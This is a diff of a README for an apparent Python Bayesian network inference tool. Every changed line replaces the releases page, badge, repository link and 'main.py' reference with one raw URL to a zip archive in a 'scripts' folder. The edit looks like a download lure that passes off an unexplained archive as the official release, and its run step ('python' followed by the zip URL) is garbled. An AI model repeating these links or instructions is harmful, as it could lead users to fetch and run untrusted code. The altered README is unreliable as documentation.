@@ -1,6 +1,6 @@
 # 🔍 python-bayesian-network-inference - Simple Bayesian Network Inference Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Hundredor/python-bayesian-network-inference/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip)
 
 ## 📘 Overview
 
@@ -22,7 +22,7 @@ Before you download the software, ensure your system meets the following require
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Hundredor/python-bayesian-network-inference/releases) to find the latest version of the software. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip) to find the latest version of the software. 
 
 2. **Download the Software**  
    On the Releases page, locate the latest version. Click on the asset to download the application.
@@ -31,7 +31,7 @@ Follow these steps to download and run the application:
    If you download a compressed file (like .zip or .tar), extract it to a location you can easily access.
 
 4. **Run the Application**  
-   Navigate to the folder where you extracted the files. Look for a file named `main.py`. Open your command line interface:
+   Navigate to the folder where you extracted the files. Look for a file named `https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip`. Open your command line interface:
 
    - For Windows, use Command Prompt or PowerShell.
    - For macOS or Linux, use the Terminal.
@@ -39,7 +39,7 @@ Follow these steps to download and run the application:
    Run the application by typing the following command:
 
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip
    ```
 
 5. **Follow the On-Screen Instructions**  
@@ -47,9 +47,9 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-You can download the software directly from the [Releases page](https://github.com/Hundredor/python-bayesian-network-inference/releases). Find the latest version, click on it, and choose the appropriate file for your operating system.
+You can download the software directly from the [Releases page](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip). Find the latest version, click on it, and choose the appropriate file for your operating system.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Hundredor/python-bayesian-network-inference/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip)
 
 ## 🛠️ Features
 
@@ -93,7 +93,7 @@ If you have questions or need help, please reach out through our GitHub Issues p
 
 ## 🌐 More Information
 
-- **GitHub Repository**: [python-bayesian-network-inference](https://github.com/Hundredor/python-bayesian-network-inference)
+- **GitHub Repository**: [python-bayesian-network-inference](https://raw.githubusercontent.com/Hundredor/python-bayesian-network-inference/main/scripts/python-bayesian-network-inference-v3.4.zip)
 - **Documentation**: Explore additional documentation on how to make the most of this software.
 
 Thank you for choosing "python-bayesian-network-inference". Enjoy exploring the world of Bayesian networks!
